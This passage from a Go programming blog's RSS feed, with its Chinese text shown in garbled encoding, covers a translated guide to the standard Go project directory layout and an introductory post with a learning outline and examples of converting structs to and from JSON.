ä»“åº“ã€‚è¿™æ˜¯ä¸€ç§å¸¸è§çš„å¸ƒå±€æ¨¡å¼ï¼Œä½†æœªè¢«æ™®éæ¥å—ï¼Œå¹¶ä¸”Goç¤¾åŒºä¸­çš„æŸäº›äººä¸æ¨èè¿™æ ·åšã€‚</p><p>å¦‚æœé¡¹ç›®ç¡®å®å¾ˆå°å¹¶ä¸”åµŒå¥—çš„å±‚æ¬¡å¹¶ä¸ä¼šå¸¦æ¥å¤šå°‘ä»·å€¼ï¼ˆé™¤éä½ å°±æ˜¯æƒ³ç”¨å®ƒï¼‰ï¼Œé‚£ä¹ˆå°±ä¸è¦ä½¿ç”¨å®ƒã€‚è¯·ä»”ç»†æ€è€ƒè¿™ç§æƒ…å†µï¼Œå½“é¡¹ç›®å˜å¾—å¾ˆå¤§ï¼Œå¹¶ä¸”æ ¹ç›®å½•ä¸­åŒ…å«çš„å†…å®¹ç›¸å½“ç¹æ‚ï¼ˆå°¤å…¶æ˜¯æœ‰å¾ˆå¤šéGoçš„ç»„ä»¶ï¼‰ã€‚</p><h3 id="vendor"><a href="#vendor" class="headerlink" title="/vendor"></a><code>/vendor</code></h3><p>åº”ç”¨ç¨‹åºçš„ä¾èµ–å…³ç³»ï¼ˆé€šè¿‡æ‰‹åŠ¨æˆ–è€…ä½¿ç”¨å–œæ¬¢çš„ä¾èµ–ç®¡ç†å·¥å…·ï¼Œå¦‚æ–°å¢çš„å†…ç½®<a href="https://github.com/golang/go/wiki/Modules">Go Modules</a>ç‰¹æ€§ï¼‰ã€‚æ‰§è¡Œ<code>go mod vendor</code>å‘½ä»¤å°†ä¼šåœ¨é¡¹ç›®ä¸­åˆ›å»º<code>/vendor</code>ç›®å½•ï¼Œæ³¨æ„ï¼Œå¦‚æœä½¿ç”¨çš„ä¸æ˜¯Go 1.14ç‰ˆæœ¬ï¼Œåœ¨æ‰§è¡Œ<code>go build</code>è¿›è¡Œç¼–è¯‘æ—¶ï¼Œéœ€è¦æ·»åŠ <code>-mod=vendor</code>å‘½ä»¤è¡Œé€‰é¡¹ï¼Œå› ä¸ºå®ƒä¸æ˜¯é»˜è®¤é€‰é¡¹ã€‚</p><p>æ„å»ºåº“æ–‡ä»¶æ—¶ï¼Œä¸è¦æäº¤åº”ç”¨ç¨‹åºä¾èµ–é¡¹ã€‚</p><p>è¯·æ³¨æ„ï¼Œä»<a href="https://golang.org/doc/go1.13#modules">1.13</a>å¼€å§‹ï¼ŒGoä¹Ÿå¯åŠ¨äº†æ¨¡å—ä»£ç†ç‰¹æ€§ï¼ˆä½¿ç”¨<code>httpsï¼š//proxy.golang.org</code>ä½œä¸ºé»˜è®¤çš„æ¨¡å—ä»£ç†æœåŠ¡å™¨ï¼‰ã€‚ç‚¹å‡»<a href="https://blog.golang.org/module-mirror-launch">è¿™é‡Œ</a>é˜…è¯»æœ‰å…³å®ƒçš„æ›´å¤šä¿¡æ¯ï¼Œæ¥äº†è§£å®ƒæ˜¯å¦ç¬¦åˆæ‰€éœ€è¦æ±‚å’Œçº¦æŸã€‚å¦‚æœ<code>Go Module</code>æ»¡è¶³éœ€è¦ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦<code>vendor</code>ç›®å½•ã€‚</p><h2 id="æœåŠ¡ç«¯åº”ç”¨ç¨‹åºçš„ç›®å½•"><a href="#æœåŠ¡ç«¯åº”ç”¨ç¨‹åºçš„ç›®å½•" class="headerlink" title="æœåŠ¡ç«¯åº”ç”¨ç¨‹åºçš„ç›®å½•"></a>æœåŠ¡ç«¯åº”ç”¨ç¨‹åºçš„ç›®å½•</h2><h3 id="api"><a href="#api" class="headerlink" title="/api"></a><code>/api</code></h3><p>OpenAPI&#x2F;Swaggerè§„èŒƒï¼ŒJSONæ¨¡å¼æ–‡ä»¶ï¼Œåè®®å®šä¹‰æ–‡ä»¶ã€‚</p><p>æ›´å¤šæ ·ä¾‹æŸ¥çœ‹<a href="https://github.com/golang-standards/project-layout/blob/master/api/README.md"><code>/api</code></a>ç›®å½•ã€‚</p><h2 id="Webåº”ç”¨ç¨‹åºçš„ç›®å½•"><a href="#Webåº”ç”¨ç¨‹åºçš„ç›®å½•" class="headerlink" title="Webåº”ç”¨ç¨‹åºçš„ç›®å½•"></a>Webåº”ç”¨ç¨‹åºçš„ç›®å½•</h2><h3 id="web"><a href="#web" class="headerlink" title="/web"></a><code>/web</code></h3><p>Webåº”ç”¨ç¨‹åºç‰¹å®šçš„ç»„ä»¶ï¼šé™æ€Webèµ„æºï¼ŒæœåŠ¡å™¨ç«¯æ¨¡æ¿å’Œå•é¡µåº”ç”¨ï¼ˆSingle-Page Appï¼ŒSPAï¼‰ã€‚</p><h2 id="é€šç”¨åº”ç”¨ç¨‹åºçš„ç›®å½•"><a href="#é€šç”¨åº”ç”¨ç¨‹åºçš„ç›®å½•" class="headerlink" title="é€šç”¨åº”ç”¨ç¨‹åºçš„ç›®å½•"></a>é€šç”¨åº”ç”¨ç¨‹åºçš„ç›®å½•</h2><h3 id="configs"><a href="#configs" class="headerlink" title="/configs"></a><code>/configs</code></h3><p>é…ç½®æ–‡ä»¶æ¨¡æ¿æˆ–é»˜è®¤é…ç½®ã€‚</p><p>å°†<code>confd</code>æˆ–è€…<code>consul-template</code>æ–‡ä»¶æ”¾åœ¨è¿™é‡Œã€‚</p><h3 id="init"><a href="#init" class="headerlink" title="/init"></a><code>/init</code></h3><p>ç³»ç»Ÿåˆå§‹åŒ–ï¼ˆsystemdã€upstartã€sysvï¼‰å’Œè¿›ç¨‹ç®¡ç†ï¼ˆrunitã€supervisordï¼‰é…ç½®ã€‚</p><h3 id="scripts"><a href="#scripts" class="headerlink" title="/scripts"></a><code>/scripts</code></h3><p>ç”¨äºæ‰§è¡Œå„ç§æ„å»ºï¼Œå®‰è£…ï¼Œåˆ†æç­‰æ“ä½œçš„è„šæœ¬ã€‚</p><p>è¿™äº›è„šæœ¬ä½¿æ ¹çº§åˆ«çš„Makefileå˜å¾—æ›´å°æ›´ç®€å•ï¼ˆä¾‹å¦‚<a href="https://github.com/hashicorp/terraform/blob/main/Makefile">https://github.com/hashicorp/terraform/blob/main/Makefile</a>ï¼‰ã€‚</p><p>æ›´å¤šæ ·ä¾‹æŸ¥çœ‹<a href="https://github.com/golang-standards/project-layout/blob/master/scripts/README.md"><code>/scripts</code></a>ã€‚</p><h3 id="build"><a href="#build" class="headerlink" title="/build"></a><code>/build</code></h3><p>æ‰“åŒ…å’ŒæŒç»­é›†æˆã€‚</p><p>å°†äº‘ï¼ˆAMIï¼‰ï¼Œå®¹å™¨ï¼ˆDockerï¼‰ï¼Œæ“ä½œç³»ç»Ÿï¼ˆdebï¼Œrpmï¼Œpkgï¼‰è½¯ä»¶åŒ…é…ç½®å’Œè„šæœ¬æ”¾åœ¨<code>/build/package</code>ç›®å½•ä¸­ã€‚</p><p>å°†CIï¼ˆtravisã€circleã€droneï¼‰é…ç½®æ–‡ä»¶å’Œå°±è„šæœ¬æ”¾åœ¨<code>build/ci</code>ç›®å½•ä¸­ã€‚è¯·æ³¨æ„ï¼Œæœ‰ä¸€äº›CIå·¥å…·ï¼ˆå¦‚ï¼Œtravis CIï¼‰å¯¹äºé…ç½®æ–‡ä»¶çš„ä½ç½®æœ‰ä¸¥æ ¼çš„è¦æ±‚ã€‚å°è¯•å°†é…ç½®æ–‡ä»¶æ”¾åœ¨<code>/build/ci</code>ç›®å½•ï¼Œç„¶åé“¾æ¥åˆ°CIå·¥å…·æƒ³è¦çš„ä½ç½®ã€‚</p><h3 id="deployments"><a href="#deployments" class="headerlink" title="/deployments"></a><code>/deployments</code></h3><p>IaaSï¼ŒPaaSï¼Œç³»ç»Ÿå’Œå®¹å™¨ç¼–æ’éƒ¨ç½²é…ç½®å’Œæ¨¡æ¿ï¼ˆdocker-composeï¼Œkubernetes&#x2F;helmï¼Œmesosï¼Œterraformï¼Œboshï¼‰ã€‚è¯·æ³¨æ„ï¼Œåœ¨æŸäº›å­˜å‚¨åº“ä¸­ï¼ˆå°¤å…¶æ˜¯ä½¿ç”¨kuberneteséƒ¨ç½²çš„åº”ç”¨ç¨‹åºï¼‰ï¼Œè¯¥ç›®å½•çš„åå­—æ˜¯<code>/deploy</code>ã€‚</p><h3 id="test"><a href="#test" class="headerlink" title="/test"></a><code>/test</code></h3><p>å¤–éƒ¨æµ‹è¯•åº”ç”¨ç¨‹åºå’Œæµ‹è¯•æ•°æ®ã€‚éšæ—¶æ ¹æ®éœ€è¦æ„å»º<code>/test</code>ç›®å½•ã€‚å¯¹äºè¾ƒå¤§çš„é¡¹ç›®ï¼Œæœ‰ä¸€ä¸ªæ•°æ®å­ç›®å½•æ›´å¥½ä¸€äº›ã€‚ä¾‹å¦‚ï¼Œå¦‚æœéœ€è¦Goå¿½ç•¥ç›®å½•ä¸­çš„å†…å®¹ï¼Œåˆ™å¯ä»¥ä½¿ç”¨<code>/test/data</code>æˆ–<code>/test/testdata</code>è¿™æ ·çš„ç›®å½•åå­—ã€‚è¯·æ³¨æ„ï¼ŒGoè¿˜å°†å¿½ç•¥ä»¥â€œ<code>.</code>â€æˆ–â€œ<code>_</code>â€å¼€å¤´çš„ç›®å½•æˆ–æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥æ›´å…·çµæ´»æ€§çš„æ¥å‘½åæµ‹è¯•æ•°æ®ç›®å½•ã€‚</p><p>æ›´å¤šæ ·ä¾‹æŸ¥çœ‹<a href="https://github.com/golang-standards/project-layout/blob/master/test/README.md"><code>/test</code></a>ã€‚</p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="docs"><a href="#docs" class="headerlink" title="/docs"></a><code>/docs</code></h3><p>è®¾è®¡å’Œç”¨æˆ·æ–‡æ¡£ï¼ˆé™¤äº†godocç”Ÿæˆçš„æ–‡æ¡£ï¼‰ã€‚</p><p>æ›´å¤šæ ·ä¾‹æŸ¥çœ‹<a href="https://github.com/golang-standards/project-layout/blob/master/docs/README.md"><code>/docs</code></a>ã€‚</p><h3 id="tools"><a href="#tools" class="headerlink" title="/tools"></a><code>/tools</code></h3><p>æ­¤é¡¹ç›®çš„æ”¯æŒå·¥å…·ã€‚è¯·æ³¨æ„ï¼Œè¿™äº›å·¥å…·å¯ä»¥ä»<code>/pkg</code>å’Œ<code>/internal</code>ç›®å½•å¯¼å…¥ä»£ç ã€‚</p><p>æ›´å¤šæ ·ä¾‹æŸ¥çœ‹<a href="https://github.com/golang-standards/project-layout/blob/master/tools/README.md"><code>/tools</code></a>ã€‚</p><h3 id="examples"><a href="#examples" class="headerlink" title="/examples"></a><code>/examples</code></h3><p>åº”ç”¨ç¨‹åºæˆ–å…¬å…±åº“çš„ç¤ºä¾‹ã€‚</p><p>æ›´å¤šæ ·ä¾‹æŸ¥çœ‹<a href="https://github.com/golang-standards/project-layout/blob/master/examples/README.md"><code>/examples</code></a>ã€‚</p><h3 id="third-party"><a href="#third-party" class="headerlink" title="/third_party"></a><code>/third_party</code></h3><p>å¤–éƒ¨è¾…åŠ©å·¥å…·ï¼Œforkçš„ä»£ç å’Œå…¶ä»–ç¬¬ä¸‰æ–¹å·¥å…·ï¼ˆä¾‹å¦‚Swagger UIï¼‰ã€‚</p><h3 id="githooks"><a href="#githooks" class="headerlink" title="/githooks"></a><code>/githooks</code></h3><p>Gitçš„é’©å­ã€‚</p><h3 id="assets"><a href="#assets" class="headerlink" title="/assets"></a><code>/assets</code></h3><p>é¡¹ç›®ä¸­ä½¿ç”¨çš„å…¶ä»–èµ„æºï¼ˆå›¾åƒï¼ŒLogoç­‰ï¼‰ã€‚</p><h3 id="website"><a href="#website" class="headerlink" title="/website"></a><code>/website</code></h3><p>å¦‚æœä¸ä½¿ç”¨Github pagesï¼Œåˆ™åœ¨è¿™é‡Œæ”¾ç½®é¡¹ç›®çš„ç½‘ç«™æ•°æ®ã€‚</p><p>æ›´å¤šæ ·ä¾‹æŸ¥çœ‹<a href="https://github.com/golang-standards/project-layout/blob/master/website/README.md"><code>/website</code></a>ã€‚</p><h2 id="ä¸åº”è¯¥å‡ºç°çš„ç›®å½•"><a href="#ä¸åº”è¯¥å‡ºç°çš„ç›®å½•" class="headerlink" title="ä¸åº”è¯¥å‡ºç°çš„ç›®å½•"></a>ä¸åº”è¯¥å‡ºç°çš„ç›®å½•</h2><h3 id="src"><a href="#src" class="headerlink" title="/src"></a><code>/src</code></h3><p>æœ‰ä¸€äº›Goé¡¹ç›®ç¡®å®åŒ…å«<code>src</code>æ–‡ä»¶å¤¹ï¼Œä½†é€šå¸¸åªæœ‰åœ¨å¼€å‘è€…æ˜¯ä»Javaï¼ˆè¿™æ˜¯Javaä¸­ä¸€ä¸ªé€šç”¨çš„æ¨¡å¼ï¼‰è½¬è¿‡æ¥çš„æƒ…å†µä¸‹æ‰ä¼šæœ‰ã€‚å¦‚æœå¯ä»¥çš„è¯è¯·ä¸è¦ä½¿ç”¨è¿™ç§Javaæ¨¡å¼ã€‚ä½ è‚¯å®šä¸å¸Œæœ›ä½ çš„Goä»£ç å’Œé¡¹ç›®çœ‹èµ·æ¥åƒJavaã€‚</p><p>ä¸è¦å°†é¡¹ç›®çº§åˆ«çš„<code>/src</code>ç›®å½•ä¸Goç”¨äºå…¶å·¥ä½œç©ºé—´çš„<code>/src</code>ç›®å½•æ··æ·†ï¼Œå°±åƒ<a href="https://golang.org/doc/code.html">How to Write Go Code</a>ä¸­æè¿°çš„é‚£æ ·ã€‚<code>$GOPATH</code>ç¯å¢ƒå˜é‡æŒ‡å‘å½“å‰çš„å·¥ä½œç©ºé—´ï¼ˆé»˜è®¤æƒ…å†µä¸‹æŒ‡å‘éWindowsç³»ç»Ÿä¸­çš„<code>$HOME/go</code>ï¼‰ã€‚æ­¤å·¥ä½œç©ºé—´åŒ…æ‹¬é¡¶çº§<code>/pkg</code>ï¼Œ<code>/bin</code>å’Œ<code>/src</code>ç›®å½•ã€‚å®é™…çš„é¡¹ç›®æœ€ç»ˆå˜æˆ<code>/src</code>ä¸‹çš„å­ç›®å½•ï¼Œå› æ­¤ï¼Œå¦‚æœé¡¹ç›®ä¸­æœ‰<code>/src</code>ç›®å½•ï¼Œåˆ™é¡¹ç›®è·¯å¾„å°†ä¼šå˜æˆï¼š<code>/some/path/to/workspace/src/your_project/src/your_code.go</code>ã€‚è¯·æ³¨æ„ï¼Œä½¿ç”¨Go 1.11ï¼Œå¯ä»¥å°†é¡¹ç›®æ”¾åœ¨GOPATHä¹‹å¤–ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€ä½¿ç”¨æ­¤å¸ƒå±€æ¨¡å¼æ˜¯ä¸ªå¥½ä¸»æ„ã€‚</p><h2 id="å¾½ç« "><a href="#å¾½ç« " class="headerlink" title="å¾½ç« "></a>å¾½ç« </h2><ul><li><a href="https://goreportcard.com/">Go Report Card</a>ï¼šå®ƒå°†ä½¿ç”¨<code>gofmt</code>ï¼Œ<code>vet</code>ï¼Œ<code>gocyclo</code>ï¼Œ<code>golint</code>ï¼Œ<code>ineffassign</code>ï¼Œ<code>license</code>å’Œ<code>mispell</code>æ‰«æé¡¹ç›®ä¸­çš„ä»£ç ã€‚å°†<code>github.com/golang-standards/project-layout</code>æ›¿æ¢ä¸ºä½ çš„é¡¹ç›®çš„å¼•ç”¨ã€‚</li><li><a href="http://godoc.org/">GoDoc</a>ï¼šå®ƒå°†æä¾›GoDocç”Ÿæˆçš„æ–‡æ¡£çš„åœ¨çº¿ç‰ˆæœ¬ã€‚æ›´æ”¹é“¾æ¥ä»¥æŒ‡å‘ä½ çš„é¡¹ç›®ã€‚</li><li>Releaseï¼šå®ƒå°†æ˜¾ç¤ºä½ é¡¹ç›®çš„æœ€æ–°ç‰ˆæœ¬å·ã€‚æ›´æ”¹githubé“¾æ¥ä»¥æŒ‡å‘ä½ çš„é¡¹ç›®ã€‚</li></ul><p><a href="https://goreportcard.com/report/github.com/golang-standards/project-layout"><img src="https://goreportcard.com/badge/github.com/golang-standards/project-layout?style=flat-square" alt="Go Report Card"></a><br><a href="http://godoc.org/github.com/golang-standards/project-layout"><img src="https://img.shields.io/badge/godoc-reference-blue.svg?style=flat-square" alt="Go Doc"></a><br><a href="https://github.com/golang-standards/project-layout/releases/latest"><img src="https://img.shields.io/github/release/golang-standards/project-layout.svg?style=flat-square" alt="Release"></a></p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>WIPé¡¹ç›®æ˜¯ä¸€ä¸ªè‡ªä»¥ä¸ºæ˜¯çš„é¡¹ç›®æ¨¡æ¿å…¶ä¸­å¸¦æœ‰<code>sample/reusable</code>é…ç½®ã€è„šæœ¬å’Œä»£ç ã€‚</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/go/">go</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/13/GO%E8%AF%AD%E8%A8%80%E5%B8%83%E5%B1%80-%E4%B8%AD%E6%96%87%E7%89%88/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>goçš„å…¥é—¨</title>
      <link>https://cjliblog.top/2023/12/13/go%E7%9A%84%E5%85%A5%E9%97%A8/</link>
      <guid>https://cjliblog.top/2023/12/13/go%E7%9A%84%E5%85%A5%E9%97%A8/</guid>
      <pubDate>Tue, 12 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å¤§çº²"><a href="#å¤§çº²" class="headerlink" title="å¤§çº²"></a>å¤§çº²</h1><h3 id="åˆå­¦è€…é˜¶æ®µ"><a href="#åˆå­¦è€…é˜¶æ®µ" class="headerlink" title="åˆå­¦è€…é˜¶æ®µ"></a>åˆå­¦è€…é˜¶æ®µ</h3><ol><li><p><strong>åŸºæœ¬è¯­æ³•å’Œæ¦‚å¿µ</strong></p><ul><li>å˜é‡ã€æ•°æ®ç±»å‹ï¼ˆæ¯”å¦‚æ•´å‹ã€å­—ç¬¦ä¸²ï¼‰</li><li>æ§åˆ¶ç»“æ„ï¼ˆifã€forå¾ªç¯ï¼‰</li><li>å‡½æ•°çš„å®šä¹‰å’Œè°ƒç”¨</li><li>é”™è¯¯å¤„ç†ï¼ˆerror ç±»å‹ï¼‰</li></ul></li><li><p><strong>åŸºæœ¬çš„æ•°æ®ç»“æ„</strong></p><ul><li>æ•°ç»„å’Œåˆ‡ç‰‡</li><li>æ˜ å°„ï¼ˆmapï¼‰</li><li>ç»“æ„ä½“ï¼ˆstructï¼‰</li></ul></li><li><p><strong>åŒ…ï¼ˆPackageï¼‰çš„ä½¿ç”¨</strong></p><ul><li>å¯¼å…¥æ ‡å‡†åº“åŒ…</li><li>åˆ›å»ºè‡ªå·±çš„åŒ…</li><li>ç†è§£åŒ…çš„å¯¼å…¥è·¯å¾„å’Œå¯è§æ€§</li></ul></li><li><p><strong>ç®€å•çš„ç¨‹åºç¼–å†™</strong></p><ul><li>ç¼–å†™å°ç¨‹åºï¼Œå¦‚è®¡ç®—å™¨ã€ç®€å•çš„æ–‡ä»¶æ“ä½œç­‰</li></ul></li><li><p><strong>å·¥å…·å’Œç¯å¢ƒ</strong></p><ul><li>Go å·¥å…·é“¾ï¼ˆå¦‚ go build, go runï¼‰</li><li>ç†è§£ GOPATH å’Œæ¨¡å—</li></ul></li></ol><h3 id="è¿›é˜¶é˜¶æ®µ"><a href="#è¿›é˜¶é˜¶æ®µ" class="headerlink" title="è¿›é˜¶é˜¶æ®µ"></a>è¿›é˜¶é˜¶æ®µ</h3><ol><li><p><strong>å¹¶å‘ç¼–ç¨‹</strong></p><ul><li>åç¨‹ï¼ˆgoroutineï¼‰</li><li>é€šé“ï¼ˆchannelï¼‰</li><li>sync åŒ…çš„ä½¿ç”¨ï¼ˆå¦‚ WaitGroupï¼‰</li></ul></li><li><p><strong>æ›´å¤æ‚çš„æ•°æ®ç»“æ„</strong></p><ul><li>æ¥å£ï¼ˆinterfaceï¼‰</li><li>åˆ‡ç‰‡å’Œæ˜ å°„çš„é«˜çº§ç”¨æ³•</li><li>ä½¿ç”¨æŒ‡é’ˆ</li></ul></li><li><p><strong>é”™è¯¯å¤„ç†å’Œæµ‹è¯•</strong></p><ul><li>æ·±å…¥ç†è§£ error æ¥å£</li><li>ç¼–å†™å•å…ƒæµ‹è¯•ï¼ˆtesting åŒ…ï¼‰</li><li>åŸºå‡†æµ‹è¯•ï¼ˆbenchmarkï¼‰</li></ul></li><li><p><strong>ç½‘ç»œç¼–ç¨‹</strong></p><ul><li>HTTP æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯</li><li>ä½¿ç”¨ TCP&#x2F;UDP</li></ul></li><li><p><strong>é¡¹ç›®ç»“æ„å’Œè®¾è®¡æ¨¡å¼</strong></p><ul><li>ç»„ç»‡å¤§å‹ Go é¡¹ç›®</li><li>æŒæ¡å¸¸ç”¨è®¾è®¡æ¨¡å¼</li></ul></li></ol><h3 id="é«˜çº§é˜¶æ®µ"><a href="#é«˜çº§é˜¶æ®µ" class="headerlink" title="é«˜çº§é˜¶æ®µ"></a>é«˜çº§é˜¶æ®µ</h3><ol><li><p><strong>æ€§èƒ½ä¼˜åŒ–</strong></p><ul><li>åˆ†æå’Œä¼˜åŒ–æ€§èƒ½ï¼ˆpprofï¼‰</li><li>å†…å­˜ç®¡ç†å’Œåƒåœ¾å›æ”¶</li><li>å¹¶å‘æ¨¡å¼å’Œä¼˜åŒ–</li></ul></li><li><p><strong>å¾®æœåŠ¡å’Œå®¹å™¨åŒ–</strong></p><ul><li>ä½¿ç”¨ Docker å®¹å™¨åŒ– Go åº”ç”¨</li><li>äº†è§£å¾®æœåŠ¡æ¶æ„</li></ul></li><li><p><strong>äº‘åŸç”Ÿå’Œ DevOps</strong></p><ul><li>Kubernetes ä¸ Go</li><li>CI&#x2F;CD æµç¨‹</li></ul></li><li><p><strong>é«˜çº§ç½‘ç»œç¼–ç¨‹</strong></p><ul><li>æ·±å…¥ç†è§£ç½‘ç»œåè®®</li><li>æ„å»ºå¤æ‚çš„ç½‘ç»œåº”ç”¨</li></ul></li><li><p><strong>è´¡çŒ®å¼€æºé¡¹ç›®</strong></p><ul><li>ç†è§£å¼€æºæ–‡åŒ–</li><li>å‚ä¸ Go ç›¸å…³çš„å¼€æºé¡¹ç›®</li></ul></li></ol><h1 id="ç»“æ„ä½“å®ä¾‹å’Œjsonçš„è½¬æ¢"><a href="#ç»“æ„ä½“å®ä¾‹å’Œjsonçš„è½¬æ¢" class="headerlink" title="ç»“æ„ä½“å®ä¾‹å’Œjsonçš„è½¬æ¢"></a>ç»“æ„ä½“å®ä¾‹å’Œjsonçš„è½¬æ¢</h1><ol><li><p><strong>å®šä¹‰ç»“æ„ä½“</strong>ï¼šé¦–å…ˆæ˜¯ä½ æä¾›çš„ <code>TODO</code> ç»“æ„ä½“ã€‚</p> <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TODO <span class="keyword">struct</span> &#123;</span><br><span class="line">    ID      <span class="type">int</span>    <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">    Content <span class="type">string</span> <span class="string">`json:&quot;content&quot;`</span></span><br><span class="line">    Done    <span class="type">bool</span>   <span class="string">`json:&quot;done&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>åºåˆ—åŒ–ï¼ˆStruct åˆ° JSONï¼‰</strong>ï¼šå°†ä¸€ä¸ª <code>TODO</code> ç»“æ„ä½“çš„å®ä¾‹è½¬æ¢æˆJSONå­—ç¬¦ä¸²ã€‚</p> <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªTODOå®ä¾‹</span></span><br><span class="line">    todo := TODO&#123;ID: <span class="number">1</span>, Content: <span class="string">&quot;ä¹°èœ&quot;</span>, Done: <span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†TODOå®ä¾‹è½¬æ¢ä¸ºJSONæ ¼å¼</span></span><br><span class="line">    jsonData, err := json.Marshal(todo)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;Error occurred during marshaling. Error: %s&quot;</span>, err.Error())</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="type">string</span>(jsonData))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>ååºåˆ—åŒ–ï¼ˆJSON åˆ° Structï¼‰</strong>ï¼šå°†ä¸€ä¸ªJSONå­—ç¬¦ä¸²è§£ææˆ <code>TODO</code> ç»“æ„ä½“çš„å®ä¾‹ã€‚</p> <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// JSONå­—ç¬¦ä¸²</span></span><br><span class="line">    jsonString := <span class="string">`&#123;&quot;id&quot;:1, &quot;content&quot;:&quot;ä¹°èœ&quot;, &quot;done&quot;:false&#125;`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†JSONå­—ç¬¦ä¸²è§£æåˆ°TODOç»“æ„ä½“</span></span><br><span class="line">    <span class="keyword">var</span> todo TODO</span><br><span class="line">    err := json.Unmarshal([]<span class="type">byte</span>(jsonString), &amp;todo)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;Error occurred during unmarshaling. Error: %s&quot;</span>, err.Error())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, todo)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="è§£é‡Šï¼š"><a href="#è§£é‡Šï¼š" class="headerlink" title="è§£é‡Šï¼š"></a>è§£é‡Šï¼š</h3><ul><li><p><strong>åºåˆ—åŒ–</strong>ï¼š<code>json.Marshal</code> å‡½æ•°ç”¨äºå°†ç»“æ„ä½“è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸²ã€‚å®ƒä¼šè‡ªåŠ¨æ ¹æ®ç»“æ„ä½“ä¸­å®šä¹‰çš„JSONæ ‡ç­¾è¿›è¡Œè½¬æ¢ã€‚</p></li><li><p><strong>ååºåˆ—åŒ–</strong>ï¼š<code>json.Unmarshal</code> å‡½æ•°ç”¨äºå°†JSONå­—ç¬¦ä¸²è§£æä¸ºç»“æ„ä½“ã€‚åŒæ ·åœ°ï¼Œå®ƒä¼šæ ¹æ®JSONæ ‡ç­¾æ¥å†³å®šå¦‚ä½•å¡«å……ç»“æ„ä½“çš„å­—æ®µã€‚</p></li></ul><p>è¿™ä¸¤ä¸ªè¿‡ç¨‹éå¸¸å…³é”®ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†Web APIæˆ–æ•°æ®å­˜å‚¨æ—¶ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒGoè¯­è¨€èƒ½å¤Ÿæ–¹ä¾¿åœ°å¤„ç†JSONæ•°æ®ï¼Œè®©ä½ çš„ç¼–ç¨‹ä¹‹æ—…æ›´åŠ é¡ºç•…ï¼</p><p>è¯•è¯•çœ‹è¿è¡Œè¿™äº›ä»£ç ï¼Œçœ‹çœ‹ç»“æœå¦‚ä½•ï¼å¦‚æœæœ‰ä»»ä½•ç–‘é—®ï¼Œæˆ–è€…æƒ³è¦æ¢è®¨æ›´å¤šï¼Œéšæ—¶å‘Šè¯‰æˆ‘å“¦ï¼ ğŸ˜ŠğŸ‘¨â€ğŸ’»ğŸš€</p><p>å¥½é—®é¢˜ï¼è§£é‡Šä¸€ä¸‹è¿™ä¸ª <code>json.Unmarshal([]byte(jsonString), &amp;todo)</code> è¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†ä¸¤éƒ¨åˆ†æ¥çœ‹ï¼š</p><ol><li><p><code>[]byte(jsonString)</code>ï¼š</p><ul><li>è¿™é‡Œï¼Œæˆ‘ä»¬æŠŠå­—ç¬¦ä¸² <code>jsonString</code> è½¬æ¢æˆäº†ä¸€ä¸ªå­—èŠ‚åˆ‡ç‰‡ï¼ˆ<code>[]byte</code>ï¼‰ã€‚</li><li>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢ï¼Ÿå› ä¸º <code>json.Unmarshal</code> å‡½æ•°éœ€è¦ä¸€ä¸ªå­—èŠ‚åˆ‡ç‰‡ä½œä¸ºè¾“å…¥ã€‚åœ¨Goè¯­è¨€ä¸­ï¼ŒJSONæ•°æ®é€šå¸¸ä»¥å­—èŠ‚å½¢å¼å¤„ç†ï¼Œè¿™æ ·å¯ä»¥æ›´é«˜æ•ˆï¼Œç‰¹åˆ«æ˜¯å¤„ç†å¤§é‡æ•°æ®æ—¶ã€‚</li><li>ç®€å•æ¥è¯´ï¼Œ<code>[]byte(jsonString)</code> å°±æ˜¯æŠŠJSONæ ¼å¼çš„å­—ç¬¦ä¸²è½¬æ¢æˆäº†Goèƒ½å¤Ÿå¤„ç†çš„å­—èŠ‚æ 